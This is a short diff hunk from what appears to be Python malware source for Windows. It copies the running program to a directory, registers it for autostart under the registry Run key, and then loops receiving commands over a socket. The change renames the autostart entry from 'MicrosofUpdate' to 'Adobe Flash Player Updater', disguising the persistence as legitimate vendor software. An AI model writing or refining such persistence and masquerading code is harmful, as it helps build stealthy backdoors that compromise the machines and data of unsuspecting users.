@@ -40,7 +40,7 @@ def startup():
     shutil.copy(sys.argv[0],dir)
     aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-    SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)
+    SetValueEx(aKey,"Adobe Flash Player Updater",0, REG_SZ, dir)
 
 while 1:
      data = s.recv(1024)
